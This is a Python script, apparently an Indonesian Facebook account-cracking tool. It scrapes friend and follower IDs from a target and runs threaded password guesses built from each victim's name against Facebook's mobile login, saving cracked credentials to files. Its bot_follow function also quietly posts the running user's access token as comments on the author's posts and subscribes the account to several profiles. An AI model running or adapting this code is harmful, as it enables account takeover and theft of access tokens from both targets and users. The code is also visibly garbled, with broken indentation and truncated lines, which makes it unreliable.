#################################################################
#                       ATHOUR : yosua wauran                   #
#                    WHATSAPP : 0895360097502                   #
#                 GITHUB : github.com/YosuaXElite3                      #
#################################################################
#By yosua wauran
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
try: import requests
except ModuleNotFoundError: os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError: os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError: os.system("python -m pip install mechanize &> /dev/null")
import requests as req
try:
        import requests
except ImportError:
        print ('[×] Modul requests belum terinstall!...\n')
        os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
import requests
import uuid
import ipaddress
import calendar
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as par
from time import sleep
from datetime import datetime
from datetime import date
import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
import requests as r, re, os
from bs4 import BeautifulSoup as par
import platform
import requests, bs4, sys, os, subprocess, random, time, re, json
import concurrent.futures
from datetime import datetime
from time import sleep
from requests import Session
import re, sys
import sys
from os import system
import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
import re
import os,random,time,sys
import json
from time import sleep as waktu
from bs4 import BeautifulSoup as parser
current = datetime.now()
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
koneksi_error=(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout)

import requests, sys, bs4, os, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as zthreads
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
try:
  os.system('mkdir dump')
        os.system('mkdir Hasil')
except (KeyError,IOError):pass
I='\033[0;32m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
H='\033[0;90m'
Q="\033[00m"
war = ("[+]")
inp = ("[-]")
bulat = ("[#]")
logo = (f"""{C}
  _   _ _______        __    __  __ ____ ____
 | \ | | ____\ \      / /   |  \/  | __ ) ___|       SCRIPT NEW-MBS
 |  \| |  _|  \ \ /\ / /____| |\/| |  _ \___ \    |————————————————————
 | |\  | |___  \ V  V /_____| |  | | |_) |__) |       Yosua NEW-MBS
 |_| \_|_____|  \_/\_/      |_|  |_|____/____/
[•] Athour    : yosua wauran
[•] Versi     : NEW
[•] WhatsApp  : 0895360097502
———————————————————————————————""")
loop = 0
ok = []
cp = []
ttl = []
fw = []
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
id = []
lq = []
iz = []
kx = 0

mb = "https://mbasic.facebook.com"
color = lambda col: "\x1b[1;"+str(col)+"m"
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
#waktu = ("%s%s%s"%(tahun,bulan,hari))
try:
        ua = open(".ua","r").read()
except:
        ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/4>
        pass

def menu():
        os.system("clear")
        try:
          toket=open("login.txt","r").read()
                token=open("login.txt","r").read()
                otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
                a = json.loads(otw.text)
                nama = a["name"]
        except KeyError:
                print((war+" Token Invalid"))
                time.sleep(1)
                login()
        try:ip=requests.get("http://ip-api.com/json/").json()["query"]
        except:ip=("None")
        print (logo)
        print("[•] Nama Kamu : "+nama)
        print("[•] Ip Kamu   : "+ip+"\n")
        print(C+"["+P+"no.1"+C+"]"+P+" Dump Id Dari Teman/Public")
        print(C+"["+P+"no.2"+C+"]"+P+" Dump Id Dari Pengikut/Follow")
        print(C+"["+P+"no.3"+C+"]"+P+" Dump Id Dari Teman + Pengikut/Public + Follow")
        print(C+"["+P+"no.4"+C+"]"+P+" Mulai Crack/Start Crack")
        print(C+"["+P+"no.5"+C+"]"+P+" Ganti User Agent")
        print(C+"["+P+"no.6"+C+"]"+P+" Check Opsi Akun Facebook ")
        print(C+"["+P+"no.00"+C+"]"+P+" Exit (hapus token)")
        ba=input("\n"+war+"Pilih Metode Crack : ")
        if ba in [""," "]:
                print(war+"Jangan Kosong Bangsat")
                time.sleep(2)
                menu()
        elif ba in ["1","01"]:
                dump_public()
        elif ba in ["2","02"]:
                dump_follow()
        elif ba in ["3","03"]:
                dump_all()
        elif ba in ["4","04"]:
                try:
                        file = input(war+"Nama File : ")
                except FileNotFoundError:
                        jalan(war+'File Tidak Ada !!')
                crackmenu(file).passmenu(file)
                exit()
        elif ba in ["5","05"]:
                ganti_ua()
        elif ba in ["6","06"]:
                relogin()
                exit()
#       elif ba in ["",""]:
        elif ba in ["0","00"]:
                jalan(war+"Terima Kasih Telah Menggunakan Script Saya !!!")
                os.system("rm -rf login.txt")
        else:
                print(war+'Isi Dengan Benar Bangsat')
def relogin():
        files = input("\n\n"+war+"Nama File : ")
        if files == "":
                print(war+'Masukan Nama File !!')
                time.sleep(3)
                relogin()
        try:
                rfiles = open(files, "r").readlines()
        except IOError:
                print(war+"File Ini Tidak Ada %s "%(files))
                relogin()
        jalan("Total Akun Facebook : \033[1;32m%s\033[1;37m"%(len(rfiles)))
        for sz in rfiles:
                linez = sz.replace("\n","")
                symbz  = linez.split("|")
                print("(-----------------------------------------------------------------)")
                print("\n"+war+"Check Akun : "+(linez.replace(" + ",""))+"\n")
                try:
                        method(symbz[0].replace("+",""), symbz[1])
                except requests.exceptions.ConnectionError:
                        print(war+"Login Failed !!")
                except Exception as e:
                        print(war+"Login Failed !")
                continue
        input(war+"Tekan Enter !!")
        menu()
        def method(user, pasw):
#       mb = ("https://mbasic.facebook.com") # save
        mb = ("https://free.facebook.com") # edit
        ses = requests.Session()
        # kntl bapackkau pecah
        ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": ">
        data = {}
        ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
        fm = ged.find("form",{"method":"post"})
        list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
        for i in fm.find_all("input"):
                if i.get("name") in list:
                        data.update({i.get("name"):i.get("value")})
                else:
                        continue
        data.update({"email":user,"pass":pasw})
        run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
        if "c_user" in ses.cookies:
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text>
                xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(t>
                print(war+I+"Successful/OK To Login"+Q+" : %s"%(str(len(xe))))
                num = 0
                for _ in xe:
                        num += 1
                        print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
        elif "checkpoint" in ses.cookies:
                form = run.find("form")
                dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
                jzst = form.find("input",{"name":"jazoest"})["value"]
                nh   = form.find("input",{"name":"nh"})["value"]
                dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit>
                xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
                ngew = [yy.text for yy in xnxx.find_all("option")]
                jalan(war+"Jumlah Akun Yang Terkait : "+str(len(ngew)))
                for opt in range(len(ngew)):
                        print("["+str(opt+1)+"] "+ngew[opt])
                if len(ngew) == 0:
                        print("\n"+war+I+"One Tap Yes / SuccessFul To Login"+Q)
                        ppx=open("Hasil/Tap_Yes.txt", "a+")
                        ppx.write(user+" | "+pasw+"\n")
                        ppx.close()
                elif len(ngew) <= 5:
                        print(war+K+"Akun Check Point !!"+Q)
                else:
                        pass
        elif "login_error" in str(run):
                oh = run.find("div",{"id":"login_error"}).find("div").text
                print(war+M+"%s%s"%(oh,Q))
        else:
                print(war+M+"Login Failed! User Id/Password Is Incorrect"+Q+"\n")


class crackmenu:

    def __init__(self,isifile):
        self.id = []
    def passmenu(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        print('\n\n'+war+'Apakah kamu mau menggunakan password manual ? y/n')
        zk = input(inp+'Pilih : ')
        if zk in ('y','Y'):
            while True:
                jalan(war+"Contoh Password : sayang,123456")
                pwx = input('\n'+inp+"Masukan Password : ")
                jalan("%sThe Password You Use : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Isi Password Dengan Benar !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimal 6 Huruf !!")
                else:
                    jalan("\n\n"+war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiS>
                    def zkth(zsc=None):
                        with zthreads(max_workers=30) as (form):
                                for uid in self.id:
                                        try:
                                          userid = uid.split('<=>')[0]
                                                form.submit(self.api, userid, zsc)
                                        except: pass
                        os.remove(self.apk)
                    zkth(pwx.split(','))
                    break
        elif zk in ('n', 'N'):
                jalan("[•] Silahkan Pilih Password Yang Mau DiLogin !!")
                print("[no.1] Crack Cepat Hasil Sedikit")
                print("[no.2] Crack Slow Hasil Lumayan")
                print("[no.3] Crack Lambat Hasil Banyak")
                ja = input("[??] Pilih yang mana : ")

                if ja in [""," "]:
                        print(war+"Jangan Kosong !!")
                        time.sleep(2)
                        crackmenu(file).passmenu(file)
                elif ja in ["1","01"]:
                        jalan(war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimp>
                        self.passwords()
                        exit()
                elif ja in ["2","02"]:
                        jalan(war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimp>
                        self.passwords1()
                        exit()
                elif ja in ["3","03"]:
                        jalan(war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimp>
                        self.passwords2()
                        exit()
#               elif ja in ["",""]:
                else:
                        print(war+"Isi Dengan Benar !!")
                        time.sleep(2)
                        crackmenu(file).passmenu(file)

        else:
            print(war+'Wrong Input! Try Again')
            time.sleep(2)
            crackmenu().passmenu()
        return


    def api(self, user, zkth):
        global ok,cp,loop
        for pw in zkth:
            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            sys.stdout.write('\r%s[NEW_MBS] %s/%s [OK]:%s [CP]:%s '%(Q,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
            try:
              loginz = open("login.txt").read()
                    token = open("login.txt").read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday']
                    print ('\r%s%s|%s|%s      %s'%(K,user,pw,dob,Q))
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    cp.append(wrt)
                    open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ' '
                except:
                    pass
                print ('\r%s%s|%s                  %s'%(K,user,pw,Q))
                wrt = ('%s|%s'%(user,pw))
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                break
                continue

        loop += 1


    def passwords(self):
            with zthreads(max_workers=25) as (form):
                for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1] ]
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1] ]
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2] ]
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345' ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")

    def passwords1(self):
            with zthreads(max_workers=25) as (form):
                for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol>
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol>
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2], "anjing>
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345', "anjing", "kontol", "sayang" ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")
            def passwords1(self):
            with zthreads(max_workers=25) as (form):
                for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol>
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol>
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2], "anjing>
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345', "anjing", "kontol", "sayang" ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")

    def passwords2(self):
            with zthreads(max_workers=25) as (form):
                for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol>
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol>
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2], "anjing>
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3>
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345', "anjing", "kontol", "123456", "sa>
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")


def ganti_ua():
        jalan(war+"Masukan User Agnet Anda !!")
        jalan(war+"Ketik * def * Untuk Seting User Agent Bawaan Script !!")
        uq = input(war+'User Agent : ')
        if uq in [""," "]:
                print(war+"Jangan Kosong Bangsat")
        elif uq in ["DEF","def","* def *","Def"]:
                print(war+"Oke User Agent Sudah Berhasil DiSeting !")
                time.sleep(1)
                os.system("rm -rf .ua")
                exit(war+"Jalankan Lagi Script : python jmbf.py")

        else:
                print(war+"Oke User Agent Sudah Berhasil DiSeting !")
                time.sleep(1)
                dump = open('.ua','w')
                dump.write(uq)
                dump.close()
                exit(war+"Jalankan Lagi Script : python NEW.py")
                def jalan(z):
        for e in z + "\n":
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.02)
def login():
    os.system("clear")
    toket = input(war+"dilarang masukin akun utama harus akun tumbal)masuk token Facebook : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((war+"Login Berhasil kawan"))
        bot_follow()
    except KeyError:
        print((war+"Token Salah"))
        os.system("clear")
        login()

def bot_follow():
        try:
                toket=open("login.txt","r").read()
                token=open("login.txt","r").read()
                otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
                a = json.loads(otw.text)
                nama = a["name"]
                id = a["id"]
        except IOError:
                print((war+" Token Salah"))
                time.sleep(1)
                login()
        print(war+'Nama Facebook Kamu : '+nama)
        print(war+'Id Facebook Kamu   : '+id)
        post1 = ('4111448792295892') # Risky 2011
        post2 = ("120338706765807") # Risky 2021
        post3 = ("167879918678352") # Sama Macam dibawah
        post4 = ('180923747373969') # Logo Zero From Risky 2021
        post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
        post6 = ("198550702277940") # Logo Akira From Risky 2031
        post7 = ("198552118944465") # Logo Attaxk From Risky 2021
        requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + toke>
        requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + toke>
        requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + toke>
        requests.post('https://graph.facebook.com/100000503718583/subscribers?access_token=' + token) ### FB Zaid (Pu>
        requests.post('https://graph.facebook.com/100000889924523/subscribers?access_token=' + token) ### FB Rahmanul>
        requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
        requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
        requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
        requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Ris>
        requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + tok>
#       requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### FB RISKY
#       requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### FB RISKY
#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
        menu()

def dump_public():
        try:
                token = open("login.txt", "r").read()
        except IOError:
                os.system("rm -rf login.txt")
                exit(war+"Token Failed !!")

        idt = input(war+"Target ID : ")
        limit = input(war+"Limit : ")
        filex = input(war+"Nama File : ")
        try:
                dump = open('dump/'+filex+'.json','w')
                for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+toke>
                        uid = i["id"]
                        nama = i["name"]
                        id.append(uid+"<=>"+nama)
                        dump.write(uid+'<=>'+nama+'\n')
                dump.close()
        except KeyError:pass
        print(war+"Total ID : %s"%(len(id)))
        jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
        jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
        input(war+"Tekan Enter !!")
        menu()

def dump_follow():
        try:
                token = open("login.txt", "r").read()
        except IOError:
                os.system("rm -rf login.txt")
                exit(war+"Token Failed !!")

        idt = input(war+"Target ID : ")
        limit = input(war+"Limit : ")
        filex = input(war+"Nama File : ")
        try:
                dump = open('dump/'+filex+'.json','w')
                for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+>
                        uid = i["id"]
                        nama = i["name"]
                        id.append(uid+"<=>"+nama)
                        dump.write(uid+'<=>'+nama+'\n')
                dump.close()
        except KeyError:pass
        print(war+"Total ID : %s"%(len(id)))
        jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
        jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
        input(war+"Tekan Enter !!")
        menu()

def dump_all():
        try:
                token = open("login.txt", "r").read()
        except IOError:
                os.system("rm -rf login.txt")
                exit(war+"Token Failed !!")

        idt = input(war+"Target ID : ")
        limit = input(war+"Limit : ")
        filex = input(war+"Nama File : ")
        try:
          token = open("login.txt", "r").read()
        except IOError:
                os.system("rm -rf login.txt")
                exit(war+"Token Failed !!")

        idt = input(war+"Target ID : ")
        limit = input(war+"Limit : ")
        filex = input(war+"Nama File : ")
        try:
                dump = open('dump/'+filex+'.json','a+')
                for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+toke>
                        uid = i["id"]
                        nama = i["name"]
                        id.append(uid+"<=>"+nama)
                        dump.write(uid+'<=>'+nama+'\n')
                dump.close()
        except KeyError:pass
        try:
                dump = open('dump/'+filex+'.json','a+')
                for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+>
                        uid = i["id"]
                        nama = i["name"]
                        id.append(uid+"<=>"+nama)
                        dump.write(uid+'<=>'+nama+'\n')
                dump.close()
        except KeyError:pass
        print(war+"Total ID : %s"%(len(id)))
        jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
        jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
        input(war+"Tekan Enter !!")
        menu()


try:menu();exit()
except Exception as e:print(war+"Error : %s"%(e))